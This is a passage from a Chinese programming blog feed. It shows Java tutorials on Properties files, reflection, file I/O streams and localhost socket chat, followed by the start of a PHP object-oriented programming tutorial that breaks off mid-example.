的联合应用："></a><strong>6.IO 和 Properties 的联合应用：</strong></h3><p><strong>示例代码：</strong></p><p><strong>test5.java</strong></p><pre><code class="hljs">package test5;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.util.Properties;public class test5 &#123;    public static void main(String[] args) throws IOException &#123;        Properties p = new Properties();        FileInputStream fis = new FileInputStream(&quot;E:\\programme\\JavaOJ\\test_ref\\src\\test5\\info&quot;);        p.load(fis);        fis.close();        String v = p.getProperty(&quot;username&quot;);        System.out.println(v);    &#125;&#125;</code></pre><p><strong>info</strong></p><pre><code class="hljs">username=K0rz3n</code></pre><p><strong>结果:</strong></p><pre><code class="hljs">K0rz3n</code></pre><blockquote><p><strong>注意：</strong></p><p>1.这种方法常用于配置文件的读取，像以上的特殊内容的配置文件又叫做 属性文件，他规范来讲是以 .properties 结尾的<br>2.key 和 value 之间可以使用 等号 冒号 空格<br>3.如果有多个谁出现在第一个就按照谁做分隔符<br>4.我们能将 value 改成类，<strong>使用反射机制动态的创建类对象,这其实是反射机制的核心</strong></p></blockquote><h3 id="7-反射机制获取类的所有属性："><a href="#7-反射机制获取类的所有属性：" class="headerlink" title="7.反射机制获取类的所有属性："></a><strong>7.反射机制获取类的所有属性：</strong></h3><h4 id="1-使用getFields"><a href="#1-使用getFields" class="headerlink" title="1.使用getFields()"></a><strong>1.使用getFields()</strong></h4><p><strong>test6.java</strong> </p><pre><code class="hljs">package test6;import java.lang.reflect.*;public class test6 &#123;    public static void main(String[] args) throws Exception&#123;        Class c = Class.forName(&quot;test6.User&quot;);        Field[] fs = c.getFields();        System.out.println(fs.length);        System.out.println(fs[0].getName());    &#125;&#125;</code></pre><p><strong>User.java</strong></p><pre><code class="hljs">package test6;public class User &#123;    private String id;    public int age;    protected String addr;    boolean sex;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1age</code></pre><p>我们发现只输出了 Public 属性</p><h4 id="2-使用getDeclaredFields"><a href="#2-使用getDeclaredFields" class="headerlink" title="2.使用getDeclaredFields()"></a><strong>2.使用getDeclaredFields()</strong></h4><p><strong>示例代码1：获取所有属性</strong></p><p><strong>test6.java</strong> </p><pre><code class="hljs">package test6;import java.lang.reflect.*;public class test6 &#123;    public static void main(String[] args) throws Exception&#123;        Class c = Class.forName(&quot;test6.User&quot;);        Field[] fs = c.getDeclaredFields();        for(Field field:fs)&#123;            System.out.println(field.getName());        &#125;    &#125;&#125;</code></pre><p><strong>User.java</strong></p><pre><code class="hljs">package test6;public class User &#123;    private String id;    public int age;    protected String addr;    boolean sex;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">idageaddrsex</code></pre><p><strong>示例代码2：获取所有属性类型</strong></p><p><strong>test6.java</strong> </p><pre><code class="hljs">package test6;import java.lang.reflect.*;public class test6 &#123;    public static void main(String[] args) throws Exception&#123;        Class c = Class.forName(&quot;test6.User&quot;);        Field[] fs = c.getDeclaredFields();        for(Field field:fs)&#123;            Class type = field.getType();             System.out.println(type.getSimpleName());        &#125;    &#125;&#125;</code></pre><p><strong>User.java</strong></p><pre><code class="hljs">package test6;public class User &#123;    private String id;    public int age;    protected String addr;    boolean sex;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">StringintStringboolean</code></pre><p><strong>示例代码3：获取所有属性修饰符</strong></p><p><strong>test6.java</strong></p><pre><code class="hljs">package test6;import java.lang.reflect.*;public class test6 &#123;    public static void main(String[] args) throws Exception&#123;        Class c = Class.forName(&quot;test6.User&quot;);        Field[] fs = c.getDeclaredFields();        for(Field field:fs)&#123;            int i = field.getModifiers();            String strModifier = Modifier.toString(i);            System.out.println(strModifier);        &#125;    &#125;&#125;</code></pre><p><strong>User.java</strong></p><pre><code class="hljs">package test6;public class User &#123;    private String id;    public int age;    protected String addr;    boolean sex;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">privatepublicprotected</code></pre><p><strong>示例代码4：综合，反编译类的所有属性</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">package test6;import com.sun.org.apache.xerces.internal.util.SynchronizedSymbolTable;import java.lang.reflect.*;public class test6 &#123;    public static void main(String[] args) throws Exception&#123;        Class c = Class.forName(&quot;test6.User&quot;);        Field[] fs = c.getDeclaredFields();        StringBuffer sb = new StringBuffer();        sb.append(Modifier.toString(c.getModifiers()) + &quot; class &quot;+c.getSimpleName()+&quot;&#123;\n&quot;);        for(Field field:fs)&#123;            sb.append(&quot;\t&quot;);            sb.append(Modifier.toString(field.getModifiers()) + &quot; &quot;);            sb.append(field.getType().getSimpleName() + &quot; &quot;);            sb.append(field.getName() + &quot;;\n&quot;);        &#125;        sb.append(&quot;&#125;&quot;);        System.out.println(sb);    &#125;&#125;</code></pre><p><strong>User.java</strong></p><pre><code class="hljs">package test6;public class User &#123;    private String id;    public int age;    protected String addr;    boolean sex;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">public class User&#123;private String id;public int age;protected String addr; boolean sex;&#125;</code></pre><h3 id="8-反射机制修改某个特定的属性："><a href="#8-反射机制修改某个特定的属性：" class="headerlink" title="8.反射机制修改某个特定的属性："></a><strong>8.反射机制修改某个特定的属性：</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">package test7;import java.lang.reflect.*;public class test7 &#123;    public static void main(String[] args) throws Exception &#123;        //获取类        Class c = Class.forName(&quot;test7.User&quot;);        //获取类的属性        Field idF = c.getDeclaredField(&quot;id&quot;);        Object o = c.newInstance();        //打破封装，能访问到私有属性        idF.setAccessible(true);        idF.set(o,&quot;100&quot;);        System.out.println(idF.get(o));    &#125;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">100</code></pre><p><strong>注意：</strong></p><p>反射机制打破了对象的封装性，导致对象的属性不安全</p><h2 id="十一、I-O-流操作"><a href="#十一、I-O-流操作" class="headerlink" title="十一、I&#x2F;O 流操作"></a><strong>十一、I&#x2F;O 流操作</strong></h2><h3 id="1-文件流的概念："><a href="#1-文件流的概念：" class="headerlink" title="1.文件流的概念："></a><strong>1.文件流的概念：</strong></h3><p>文件程序中是以流的形式操作的</p><p>1.输入流：文件到内存<br>2.输出流：内存到文件</p><h3 id="2-文件流的分类"><a href="#2-文件流的分类" class="headerlink" title="2.文件流的分类"></a><strong>2.文件流的分类</strong></h3><h4 id="1-字节流："><a href="#1-字节流：" class="headerlink" title="1.字节流："></a><strong>1.字节流：</strong></h4><p>可用于读写二进制类型的文件以及任何类型的文件</p><p>(1)输入流：InputStream<br>(2)输出流：OutputStream</p><h4 id="2-字符流："><a href="#2-字符流：" class="headerlink" title="2.字符流："></a><strong>2.字符流：</strong></h4><p>只能用来读写文本文件</p><p>(1)输入流：Reader<br>(2)输出流：Writer</p><h3 id="3-I-O的基本操作"><a href="#3-I-O的基本操作" class="headerlink" title="3.I&#x2F;O的基本操作"></a><strong>3.I&#x2F;O的基本操作</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">package filetest;import java.io.*;import java.util.List;public class demo1 &#123;    public static void main(String args[])&#123;                //检测文件的属性                File f = new File(&quot;d:/abc.txt&quot;);        System.out.println(&quot;文件的路径是：&quot;+f.getAbsolutePath());        System.out.println(&quot;文件的大小是：&quot;+f.length()+&quot;byte&quot;);            //创建文件                File f  = new File(&quot;d:\\create.txt&quot;);        if(!f.exists())&#123;            try &#123;                f.createNewFile();                System.out.println(&quot;文件创建成功&quot;);            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;        &#125;else&#123;            System.out.println(&quot;文件已经存在不能重复创建&quot;);        &#125;                //创建文件夹                 File f = new File(&quot;d:\\ff&quot;);         if(f.isDirectory())&#123;            System.out.println(&quot;该文件夹已经存在&quot;);            &#125;else&#123;                f.mkdir();                System.out.println(&quot;文件夹创建成功&quot;);            &#125;        &#125;                //遍历文件夹下面的文件                    File f = new File(&quot;D:\\phpstudy&quot;);            if(f.isDirectory())&#123;                File list[] = f.listFiles();                for(int i=0;i&lt;list.length;i++)&#123;                    System.out.println(list[i].getName());                &#125;            &#125;    &#125;&#125;</code></pre><h3 id="4-文件的基本操作"><a href="#4-文件的基本操作" class="headerlink" title="4.文件的基本操作"></a><strong>4.文件的基本操作</strong></h3><h4 id="1-从文件中读取内容"><a href="#1-从文件中读取内容" class="headerlink" title="1.从文件中读取内容"></a><strong>1.从文件中读取内容</strong></h4><p>f 文件对象没有读的能力，于是需要使用 FileInputStream 进行包装</p><p><strong>示例代码：</strong></p><pre><code class="hljs">package filetest;import java.io.*;import java.util.List;public class demo1 &#123;    public static void main(String args[])&#123;        File f = new File(&quot;d:\\create.txt&quot;);        FileInputStream fis = null;        try &#123;            fis = new FileInputStream(f); // 对f 进行的包装，让其有读的功能            byte bytes[] = new byte[1024];//字节数组就相当于是一个缓存            int n =0;            try &#123;                while((n = fis.read(bytes))!=-1)&#123;// n 表示实际读取到的字节数                    String s = new String(bytes,0,n);// 把字节转化成 string                    System.out.println(s);                &#125;            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;        &#125; catch (FileNotFoundException e) &#123;            e.printStackTrace();        &#125;finally &#123;            //关闭文件流            try &#123;                fis.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;</code></pre><h4 id="2-写内容到文件"><a href="#2-写内容到文件" class="headerlink" title="2.写内容到文件"></a><strong>2.写内容到文件</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">package filetest;import java.io.*;import java.util.List;public class demo1 &#123;    public static void main(String args[])&#123;        File f = new File(&quot;d:\\dd.txt&quot;);        FileOutputStream fos = null;        try &#123;            fos = new FileOutputStream(f);            String s = &quot;HELLO WORLD\r\n&quot;;            String s1 = &quot;世界你好&quot;;            try &#123;                fos.write(s.getBytes());                fos.write(s1.getBytes());            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;        &#125; catch (FileNotFoundException e) &#123;            e.printStackTrace();        &#125;    &#125;</code></pre><h4 id="3-实现图片的拷贝"><a href="#3-实现图片的拷贝" class="headerlink" title="3.实现图片的拷贝"></a><strong>3.实现图片的拷贝</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">package filetest;import java.io.*;import java.util.List;public class demo1 &#123;    public static void main(String args[])&#123;        File f = new File(&quot;d:\\solved.bmp&quot;);        File f1 = new File(&quot;e:\\solved.bmp&quot;);        if(!f1.exists())&#123;            try &#123;                f1.createNewFile();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;        &#125;        FileInputStream fis = null;        FileOutputStream fos = null;        try &#123;            fis = new FileInputStream(f);            fos = new FileOutputStream(f1);            byte bytes[] = new byte[1024];            int n =0;            try &#123;                while((n = fis.read(bytes))!=-1)&#123;                    String s = new String(bytes,0,n);                    fos.write(bytes);                    System.out.println(&quot;拷贝成功&quot;);                &#125;            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;        &#125; catch (FileNotFoundException e) &#123;            e.printStackTrace();        &#125;finally &#123;            try &#123;                fis.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;            try &#123;                fos.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;</code></pre><h4 id="4-文件字符流"><a href="#4-文件字符流" class="headerlink" title="4.文件字符流"></a><strong>4.文件字符流</strong></h4><p>使用字符一次能读两个字节</p><p><strong>示例代码：</strong></p><pre><code class="hljs">package filetest;import java.io.*;import java.util.List;public class demo1 &#123;    public static void main(String args[])&#123;        File f = new File(&quot;d:\\hh.txt&quot;);        File f1 = new File(&quot;e:\\hh.txt&quot;);        FileReader fr = null;        FileWriter fw = null;        try &#123;            fr = new FileReader(f);            fw = new FileWriter(f1);            char[] c = new char[1024];            int n =0;            while((n =fr.read(c))!=-1)&#123;                fw.write(c,0,n);            &#125;        &#125; catch (FileNotFoundException e) &#123;            e.printStackTrace();        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;finally &#123;            try &#123;                fr.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;            try &#123;                fw.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;        &#125;   &#125;       </code></pre><h4 id="5-缓冲字符流"><a href="#5-缓冲字符流" class="headerlink" title="5.缓冲字符流"></a><strong>5.缓冲字符流</strong></h4><p>缓冲字符流能一行一行的读取，这个特性深受广大程序员的喜爱</p><p><strong>示例代码：</strong></p><pre><code class="hljs">package filetest;import java.io.*;import java.util.List;public class demo1 &#123;    public static void main(String args[])&#123;        BufferedReader br = null;        BufferedWriter bw = null;        try &#123;            FileReader fr = new FileReader(&quot;d:\\hh.txt&quot;);            FileWriter fw = new FileWriter(&quot;e:\\aa.txt&quot;);            br = new BufferedReader(fr);            bw = new BufferedWriter(fw);            String s = &quot;&quot;;            while((s = br.readLine())!=null)&#123;               // System.out.println(s);                bw.write(s+&quot;\r\n&quot;);            &#125;        &#125; catch (FileNotFoundException e) &#123;            e.printStackTrace();        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;finally &#123;            try &#123;                br.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;            try &#123;                bw.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;</code></pre><h2 id="十二、网络编程基础"><a href="#十二、网络编程基础" class="headerlink" title="十二、网络编程基础"></a><strong>十二、网络编程基础</strong></h2><p><strong>java 网络通信的示意图如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B.png" alt="此处输入图片的描述"></p><h3 id="实现客户端和服务器互发信息"><a href="#实现客户端和服务器互发信息" class="headerlink" title="实现客户端和服务器互发信息"></a><strong>实现客户端和服务器互发信息</strong></h3><p><strong>server端</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">package net;import java.io.*;import java.net.*;public class server1 &#123;    public static void main(String args[]) &#123;        server1 s1 = new server1();    &#125;    public server1() &#123;        try &#123;            ServerSocket ss = new ServerSocket(9999);            System.out.println(&quot;服务端正在监听9999端口&quot;);            Socket s = ss.accept();//这个函数返回一个 sockect 连接，是阻塞的            InputStreamReader isr = new InputStreamReader(s.getInputStream());            BufferedReader br = new BufferedReader(isr);            PrintWriter pw = new PrintWriter(s.getOutputStream(), true);            InputStreamReader isr2 = new InputStreamReader(System.in);            BufferedReader br2 = new BufferedReader(isr2);            while (true) &#123;                String info = br.readLine();                System.out.println(&quot;客户端发来：&quot; + info);                if(info == &quot;bye&quot;)&#123;                    s.close();                    break;                &#125;                System.out.println(&quot;你想对客户端说：&quot;);                String response = br2.readLine();                pw.println(response);            &#125;        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p><strong>Client 端</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">package net;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.io.PrintWriter;import java.net.Socket;public class client1 &#123;    public static void main(String args[])&#123;        client1 c1 = new client1();    &#125;    public client1()&#123;        try &#123;            Socket s = new Socket(&quot;127.0.0.1&quot;,9999);            PrintWriter pw = new PrintWriter(s.getOutputStream(),true);//向 socket 写数据，true 表示你即时刷新            InputStreamReader isr = new InputStreamReader(System.in);            BufferedReader br = new BufferedReader(isr);            InputStreamReader isr2 = new InputStreamReader(s.getInputStream());            BufferedReader br2 = new BufferedReader(isr2);            while(true)&#123;                System.out.println(&quot;请输入你想对服务器说的话：&quot;);                String info = br.readLine();                pw.println(info);                if(info == &quot;bye&quot;)&#123;                    s.close();                    break;                &#125;                System.out.println(&quot;服务器响应：&quot;);                String response = br2.readLine();                System.out.println(response);            &#125;        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 JAVA 基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 编程进阶（重点是面向对象和MVC）</title>
    <link href="/2018/10/05/PHP%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E6%98%AF%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8CMVC%EF%BC%89/"/>
    <url>/2018/10/05/PHP%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E6%98%AF%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8CMVC%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、面向对象的基本概念"><a href="#一、面向对象的基本概念" class="headerlink" title="一、面向对象的基本概念"></a><strong>一、面向对象的基本概念</strong></h2><h3 id="1-类和对象"><a href="#1-类和对象" class="headerlink" title="1.类和对象"></a><strong>1.类和对象</strong></h3><p>类是描述一类事物的抽象名称</p><pre><code class="hljs">class 类名&#123;    类的描述&#125;</code></pre><p>对象是一个具体的事物，他必然隶属于某个类</p><pre><code class="hljs">$obj = new 类名();</code></pre><span id="more"></span><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?php class Dog&#123;var $color = &quot;&quot;;function speak()&#123;echo &quot;wangwang&quot;;&#125;&#125;$dog1 = new Dog();$dog1 -&gt; color = &quot;red&quot;;$dog1 -&gt; speak();</code></pre><h3 id="2-属性和方法："><a href="#2-属性和方法：" class="headerlink" title="2.属性和方法："></a><strong>2.属性和方法：</strong></h3><p>属性本质就是变量，只不过失去了自由，现在只能被这个类或者这个类实例化的对象访问 对象 -&gt; 属性,用于描述这个类的一些共同的特征信息</p><p>方法本质就是函数，只不过失去了自由，现在只能被这个类或者这个类实例化的对象访问 对象 -&gt; 方法，用于描述这个类的一些共同的行为动作</p><h3 id="3-对象的创建形式："><a href="#3-对象的创建形式：" class="headerlink" title="3.对象的创建形式："></a><strong>3.对象的创建形式：</strong></h3><p><strong>1.方法一：</strong></p><pre><code class="hljs">$obj = new 类名();</code></pre><p><strong>2.方法二：</strong></p><pre><code class="hljs">$a = &quot;类名&quot;；$obj = $a();</code></pre><p><strong>这就是我们所说的“可变类”</strong></p><p><strong>3. 方法三:</strong></p><pre><code class="hljs">$obj = new 类名();$obj1 = new $obj();</code></pre><p>这个就比较神奇了，我们用一个对象去创建了这个对象所属类的另一个对象</p><p><strong>4.方法四：</strong></p><pre><code class="hljs">$obj = new self;</code></pre><p>创建本类</p><h3 id="4-对象的使用："><a href="#4-对象的使用：" class="headerlink" title="4.对象的使用："></a><strong>4.对象的使用：</strong></h3><p>使用属性就将其看成是变量，可以取值赋值或者 unset()、 isset()<br>使用方法就是一个函数</p><h3 id="5-对象的值传递"><a href="#5-对象的值传递" class="headerlink" title="5.对象的值传递"></a><strong>5.对象的值传递</strong></h3><p>我们知道变量的传值是值传递，只有在使用了&amp; 符号以后才是引用传递，那么我们来做一个实验：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass Dog&#123;   var $p1 =1;&#125;$t1 = new Dog();$t2 = $t1;echo &quot;t1中的p1 &quot;.$t1-&gt;p1.&quot;&lt;br&gt;&quot;;echo &quot;t2中的p1 &quot;.$t2-&gt;p1.&quot;&lt;br&gt;&quot;;$t1-&gt;p1 = 11;echo &quot;赋值后t1中的p1 &quot;.$t1-&gt;p1.&quot;&lt;br&gt;&quot;;echo &quot;赋值后t2中的p1 &quot;.$t2-&gt;p1.&quot;&lt;br&gt;&quot;;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">t1中的p1 1t2中的p1 1赋值后t1中的p1 11赋值后t2中的p1 11</code></pre><p>我们发现好像并不是这样了，这是为什么呢？</p><p><strong>解释：</strong></p><p>对象的的赋值和普通变量的赋值是有差别的，我们在普通变量赋值的时候这个变量是直接拿到的值，但是对象赋值传递的是<strong>编号</strong>，（我们在生成一个新的对象的时候本省就不是将对象直接给变量，而是将对象的编号赋值给变量，然后变量通过这个编号间接地操纵这个对象，这个编号能通过 var_dump() 看到，但是并不能选择，因此如果我们两个变量拿到的都是同一个编号的话自然他们操纵的就是同一个变量了，我们有上面的结果也就不奇怪了）</p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%B5%8B%E5%80%BC1.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%B5%8B%E5%80%BC2.png" alt="此处输入图片的描述"></p><p>那我们使用引用传递呢？</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass Dog&#123;   var $p1 =1;&#125;$t1 = new Dog();$t2 = $t1;echo &quot;t1中的p1 &quot;.$t1-&gt;p1.&quot;&lt;br&gt;&quot;;echo &quot;t2中的p1 &quot;.$t2-&gt;p1.&quot;&lt;br&gt;&quot;;$t1-&gt;p1 = 11;echo &quot;赋值后t1中的p1 &quot;.$t1-&gt;p1.&quot;&lt;br&gt;&quot;;echo &quot;赋值后t2中的p1 &quot;.$t2-&gt;p1.&quot;&lt;br&gt;&quot;;$t2 = &amp;$t1;$t1-&gt;p1 = 111;echo &quot;赋值后t1中的p1 &quot;.$t1-&gt;p1.&quot;&lt;br&gt;&quot;;echo &quot;赋值后t2中的p1 &quot;.$t2-&gt;p1.&quot;&lt;br&gt;&quot;;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">t1中的p1 1t2中的p1 1赋值后t1中的p1 11赋值后t2中的p1 11赋值后t1中的p1 111赋值后t2中的p1 111</code></pre><p><strong>那么赋值的示意图是什么样子的呢？</strong></p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%B5%8B%E5%80%BC3.png" alt="此处输入图片的描述"></p><p><strong>结论：</strong></p><p>对于对象来讲，传递的都是编号，操纵的也都是编号，如果我们unset() 一个变量，只是对象和编号之间的连线断了，并不影响另一个变量，但是如果我们给引用赋值的对象赋值一个数字，这样就相当于断了编号与原始对象之间的联系，由于引用赋值，用的是一条线，那么另一个也不能用了，但是直接赋值由于是独立的两条线就没有影响。</p><h3 id="6-静态属性和静态方法"><a href="#6-静态属性和静态方法" class="headerlink" title="6.静态属性和静态方法"></a><strong>6.静态属性和静态方法</strong></h3><p>静态属性和静态方法是只隶属于类的属性和方法,应该通过类来调用</p><h4 id="定义格式："><a href="#定义格式：" class="headerlink" title="定义格式："></a><strong>定义格式：</strong></h4><p>static 属性名[&#x3D;xxx]；<br>static function 方法名(){xxx};</p><h4 id="访问格式："><a href="#访问格式：" class="headerlink" title="访问格式："></a><strong>访问格式：</strong></h4><pre><code class="hljs">类名：：$属性名类名：：方法名</code></pre><p>我们有了静态属性和静态方法，调用的时候就不必new 对象了，可以直接使用类名调用</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass Dog&#123;   static $p1 =1;   static function hello()&#123;       return &quot;helo world&quot;;   &#125;&#125;echo Dog :: hello().&quot;&lt;br&gt;&quot;;echo Dog :: $p1;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">helo world1</code></pre><h3 id="7-this-和-self-关键字"><a href="#7-this-和-self-关键字" class="headerlink" title="7.this 和 self 关键字"></a><strong>7.this 和 self 关键字</strong></h3><p>$this 代表当前类的对象<br>self  代表类本身</p><p>如果你学过Python 的面向对象的话，这里的 this 就相当于 python 中的 self 这里的 self 就是 python 中的 cls</p><p>self 在类内部改变静态变量的值很有用<br>$this 不能用在静态方法中，因为调用静态方法的是类而不是类对象</p><h3 id="8-类常量"><a href="#8-类常量" class="headerlink" title="8.类常量"></a><strong>8.类常量</strong></h3><p>就是常量，只能放在一个类中，只能用该类去调用，并且这个常量在声明的时候必须赋值</p><pre><code class="hljs">class 类名&#123;    const 常量名 = 常量值；&#125;</code></pre><h3 id="9-构造方法"><a href="#9-构造方法" class="headerlink" title="9.构造方法"></a><strong>9.构造方法</strong></h3><h4 id="1-概念："><a href="#1-概念：" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h4><p>就是在一个类进行实例化的时候会自动调用的方法，使用一个固定的名字 <code>__construct</code></p><p>构造方法通常是用来简化我们对象属性的初始化工作的</p><h3 id="10-析构方法"><a href="#10-析构方法" class="headerlink" title="10.析构方法"></a><strong>10.析构方法</strong></h3><h4 id="1-概念：-1"><a href="#1-概念：-1" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h4><p>就是在一个对象被销毁的时候自动调用的方法，使用一个固定的名字 <code>__destruct</code></p><h4 id="2-那么什么时候对象会被销毁呢？"><a href="#2-那么什么时候对象会被销毁呢？" class="headerlink" title="2.那么什么时候对象会被销毁呢？"></a><strong>2.那么什么时候对象会被销毁呢？</strong></h4><p>(1)当网页代码执行结束的时候，所有的对象都会被销毁，（变量会按照生成的顺序逆序的销毁）<br>(2)当一个对象没有变量引用的时候（引用计数机制）</p><h2 id="二、类的继承"><a href="#二、类的继承" class="headerlink" title="二、类的继承"></a><strong>二、类的继承</strong></h2><h3 id="1-基本概念："><a href="#1-基本概念：" class="headerlink" title="1.基本概念："></a><strong>1.基本概念：</strong></h3><p>如果一个类B 自动拥有了另一个类 A 的特征信息，那么我们就说 B 继承了 A </p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass A&#123;    function speak()&#123;        echo &quot;wangwang&quot;.&quot;&lt;br&gt;&quot;;    &#125;&#125;class B extends A&#123;    function move()&#123;        echo &quot;i can move&lt;br&gt;&quot;;    &#125;&#125;$dog = new B();$dog-&gt;speak();$dog-&gt;move();</code></pre><p><strong>结果:</strong></p><pre><code class="hljs">wangwangi can move</code></pre><h3 id="2-派生"><a href="#2-派生" class="headerlink" title="2.派生"></a><strong>2.派生</strong></h3><p>派生是继承的另一个角度的说法，比如 B 继承了 A, 那么就说 A 派生了 B </p><h3 id="3-单继承"><a href="#3-单继承" class="headerlink" title="3.单继承"></a><strong>3.单继承</strong></h3><p>PHP 和大多数的面向对象的语言都是单继承模式，C++ 支持多继承， Python 也支持多继承</p><h3 id="4-访问控制修饰符"><a href="#4-访问控制修饰符" class="headerlink" title="4.访问控制修饰符"></a><strong>4.访问控制修饰符</strong></h3><p>修饰符就是放在一个属性或者方法的前面用来表明这个属性或者方法的可访问程度的关键字。在 php 中只有三个</p><p>public : 谁都能访问，var 在修饰属性的时候和 public 是一样的<br>protected ： 只有自己家族内部可以访问（具有继承关系的多个类之间）<br>private ： 只有自己可以访问</p><p><strong>注意：</strong><br>对于属性必须使用修饰符<br>对于方法可以省略修饰符，省略默认为public </p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass Person&#123;    public $name;    protected $age;    private $password;    function __construct($name,$age,$pass)&#123;        $this-&gt;name = $name;        $this-&gt;age = $age;        $this-&gt;password = $pass;    &#125;&#125;$xiaoming = new Person(&quot;小明&quot;,18,&quot;123456&quot;);echo $xiaoming-&gt;name;echo $xiaoming-&gt;age;echo $xiaoming-&gt;password;</code></pre><p><strong>结果：</strong></p><p>这段代码只能打印出一个小明，然后就会报错</p><p>这验证了我们的修饰符的作用，我们想要访问只能让他自己和我们说</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass Person&#123;    public $name;    protected $age;    private $password;    function __construct($name,$age,$pass)&#123;        $this-&gt;name = $name;        $this-&gt;age = $age;        $this-&gt;password = $pass;    &#125;    function showInfo()&#123;        echo $this-&gt;name.&quot;&lt;br&gt;&quot;;        echo $this-&gt;age.&quot;&lt;br&gt;&quot;;        echo $this-&gt;password;    &#125;&#125;$xiaoming = new Person(&quot;小明&quot;,18,&quot;123456&quot;);$xiaoming-&gt;showInfo();</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">小明18123456</code></pre><p>同样如果我们使用一个类去继承这个 Person 类，我么还是这样访问，我们就会发现没法打印出password ，因为是 private 的只能自己类访问 </p><h3 id="5-构造方法和析构方法在继承中的表现"><a href="#5-构造方法和析构方法在继承中的表现" class="headerlink" title="5.构造方法和析构方法在继承中的表现"></a><strong>5.构造方法和析构方法在继承中的表现</strong></h3><p>如果子类没有就会自动调用父类的<br>如果子类有就调用自己的，但是我们能在子类的方法中人为的调用父类的，形式为： parent :: 对应父类方法</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass A&#123;    function __construct()&#123;        echo &quot;父类A的构造方法&lt;br&gt;&quot;;    &#125;&#125;class B extends A&#123;    function __construct()&#123;        echo &quot;子类B的构造方法&lt;br&gt;&quot;;        parent :: __construct();    &#125;&#125;$b = new B();</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">子类B的构造方法父类A的构造方法</code></pre><h3 id="6-parent-关键字"><a href="#6-parent-关键字" class="headerlink" title="6.parent 关键字"></a><strong>6.parent 关键字</strong></h3><p>parent  关键字用来表示某一个类的父类（或者说父类的对象），类似于Python 中的 super()，常常在子类中去访问父类的方法或者属性，他的使用形式只有一个</p><pre><code class="hljs">parent :: 父类的属性或者方法</code></pre><p>常常用于子类不想重写父类已经出现过得构造方法，就用这个避免重写，只要添加新的就可以了</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpclass Person&#123;    public $name = &quot; &quot;;    public $age = &quot; &quot;;    function __construct($name,$age)&#123;        $this -&gt; name = $name;        $this -&gt; age = $age;    &#125;    function showInfo()&#123;        echo &quot;xxxx&quot;;        echo &quot;yyyy&quot;;    &#125;&#125;class Teacher extends Person&#123;    public $edu;    function __construct($name, $age ,$edu)    &#123;        parent::__construct($name, $age);        $this -&gt; edu = $edu;    &#125;    function showInfo()    &#123;        parent::showInfo(); // TODO: Change the autogenerated stub        echo &quot;zzzz&quot;;    